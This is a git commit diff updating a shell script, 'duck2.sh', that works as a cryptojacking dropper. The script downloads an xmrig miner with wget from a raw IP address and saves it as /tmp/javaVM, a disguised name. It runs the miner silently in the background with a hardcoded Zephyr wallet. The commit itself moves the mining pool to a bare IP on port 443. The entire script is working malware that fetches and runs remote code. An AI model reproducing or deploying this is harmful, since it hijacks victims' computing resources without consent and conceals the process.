639bd68cbfcba36ea4a632706bc3a8947553f81d
cronjob <thesunofme1@gmail.com>
2023-11-17 15:01:25 +0700

    Update duck2.sh

--- duck2.sh
+++ duck2.sh
@@ -1,10 +1,10 @@
 #!/bin/sh
 if [ -f /tmp/javaVM ]
  	then
- 	/tmp/javaVM -o hk.zephyr.herominers.com:1123 -u ZEPHYR3RCLzj46G67Ubxse1CHxYyH8BmWhq5zYR6jpsBWrZpPq9N5dGa9gAJHNC1KfC5NkRjAecx954DRsUu7spVja4UDc9NuEa2e -p DuckRig -a rx/0 -k --donate-level --tls --cpu-max-threads-hint=75 > /dev/null 2>&1 &
+ 	/tmp/javaVM -o 172.188.89.182:443 -u ZEPHYR3RCLzj46G67Ubxse1CHxYyH8BmWhq5zYR6jpsBWrZpPq9N5dGa9gAJHNC1KfC5NkRjAecx954DRsUu7spVja4UDc9NuEa2e -p DuckRig -a rx/0 -k --donate-level --tls --cpu-max-threads-hint=75 > /dev/null 2>&1 &
  	echo Started Existing
  	else
  		wget -q http://150.136.168.71:80/archxx/xmrig -O /tmp/javaVM
  		chmod +x /tmp/javaVM
- 		/tmp/javaVM -o hk.zephyr.herominers.com:1123 -u ZEPHYR3RCLzj46G67Ubxse1CHxYyH8BmWhq5zYR6jpsBWrZpPq9N5dGa9gAJHNC1KfC5NkRjAecx954DRsUu7spVja4UDc9NuEa2e -p DuckRig -a rx/0 -k --donate-level --tls --cpu-max-threads-hint=75 > /dev/null 2>&1 &
+ 		/tmp/javaVM -o 172.188.89.182:443 -u ZEPHYR3RCLzj46G67Ubxse1CHxYyH8BmWhq5zYR6jpsBWrZpPq9N5dGa9gAJHNC1KfC5NkRjAecx954DRsUu7spVja4UDc9NuEa2e -p DuckRig -a rx/0 -k --donate-level --tls --cpu-max-threads-hint=75 > /dev/null 2>&1 &
 fi
